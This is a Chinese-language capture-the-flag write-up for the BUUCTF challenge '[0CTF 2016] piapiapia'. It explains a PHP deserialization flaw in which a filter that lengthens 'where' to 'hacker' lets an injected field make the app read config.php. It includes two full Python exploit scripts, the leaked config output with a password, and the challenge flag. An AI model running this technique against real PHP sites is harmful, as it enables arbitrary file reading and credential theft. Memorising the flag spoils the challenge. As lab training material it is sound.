---
title: "[0CTF 2016] piapiapia"
platform: BUUCTF
category: Web
difficulty: Medium
tags: [php-deserialization, string-length-manipulation, filter-bypass]
vulnerability: PHP serialization length manipulation via filter word expansion
solved: true
flag: "flag{ef974b0c-1e6a-461f-a2be-da49d32379db}"
---

# [0CTF 2016] piapiapia

## 题目概述
PHP Web 应用，包含登录、注册、个人资料更新功能。源码通过 `www.zip` 泄露，存在 PHP 反序列化漏洞配合字符串过滤器导致的长度溢出。

## 信息收集
1. 访问题目发现登录页面，检查 `www.zip` 发现有源码备份
2. 源码包含：`config.php`（含 flag）、`class.php`（数据库操作类）、`update.php`（资料更新）、`profile.php`（资料显示）
3. 关键发现：
   - `profile.php:12` 使用 `unserialize($profile)` 反序列化用户资料
   - `profile.php:16` 使用 `file_get_contents($profile['photo'])` 读取文件
   - `class.php:85-93` 的 `filter()` 函数将 `where` 替换为 `hacker`（5→6 字节）

## 漏洞分析
**PHP 序列化长度溢出漏洞**：

1. `update.php` 将用户资料序列化后存入数据库
2. `filter()` 函数在序列化后替换敏感词，`where`(5字节) → `hacker`(6字节)
3. 序列化字符串中的长度字段 `s:N` 不会更新，导致实际内容比声明长度长
4. 反序列化时，PHP 读取 N 字节后停止，后续内容被解析为新字段

**攻击链**：
- 通过 `nickname[]` 数组绕过正则检查
- 构造 payload 使 `photo` 字段指向 `config.php`
- 触发 `file_get_contents()` 读取 flag

## 利用过程

```python
import requests
import base64

BASE_URL = "http://target:port/"
session = requests.Session()

# 1. 注册并登录
session.post(f"{BASE_URL}/register.php", data={"username": "test", "password": "test123"})
session.post(f"{BASE_URL}/index.php", data={"username": "test", "password": "test123"})

# 2. 构造 payload
# payload: ";}s:5:"photo";s:10:"config.php";}
# 长度 34 字节，需要 34 个 "where" 来产生 34 字节溢出
payload = '";}s:5:"photo";s:10:"config.php";}'
nickname_content = "where" * len(payload) + payload

# 3. 发送 payload（nickname[] 绕过正则）
files = {'photo': ('test.jpg', b'A' * 100, 'image/jpeg')}
data = {
    'phone': '12345678901',
    'email': 'a@b.com',
    'nickname[]': nickname_content  # 数组绕过 preg_match
}
session.post(f"{BASE_URL}/update.php", data=data, files=files)

# 4. 访问 profile.php 触发反序列化，读取 config.php
r = session.get(f"{BASE_URL}/profile.php")
# 从 base64 编码的图片数据中提取 flag
start = r.text.find('base64,') + 7
b64_content = r.text[start:r.text.find('"', start)]
print(base64.b64decode(b64_content).decode())
```

## 复现步骤

```bash
# 完整利用脚本
python3 << 'EOF'
import requests, base64

BASE = "http://a621ba99-e217-418f-8998-f26f9698e843.node5.buuoj.cn:81"
s = requests.Session()

# 注册登录
s.post(f"{BASE}/register.php", data={"username": "pwn", "password": "pwn123"})
s.post(f"{BASE}/index.php", data={"username": "pwn", "password": "pwn123"})

# 构造 payload: 34 个 where + 注入字段
payload = '";}s:5:"photo";s:10:"config.php";}'
nick = "where" * len(payload) + payload

# 发送利用
files = {'photo': ('x', b'A'*100, 'img/jpeg')}
s.post(f"{BASE}/update.php", data={'phone':'1'*11,'email':'a@b.com','nickname[]':nick}, files=files)

# 获取 flag
r = s.get(f"{BASE}/profile.php")
b64 = r.text[r.text.find('base64,')+7:r.text.find('"',r.text.find('base64,'))]
print(base64.b64decode(b64).decode())
EOF
```

**输出**：
```php
<?php
$config['hostname'] = '127.0.0.1';
$config['username'] = 'root';
$config['password'] = 'qwertyuiop';
$config['database'] = 'challenges';
$flag = 'flag{ef974b0c-1e6a-461f-a2be-da49d32379db}';
?>
```

## 关键技术点
1. **数组绕过正则**：`nickname[]` 使 `preg_match` 返回 false（期望字符串，收到数组）
2. **长度计算**：34 个 `where` → 34 个 `hacker`，每个多 1 字节，共溢出 34 字节
3. **序列化结构**：payload `";}s:5:"photo";s:10:"config.php";}` 正好注入 photo 字段
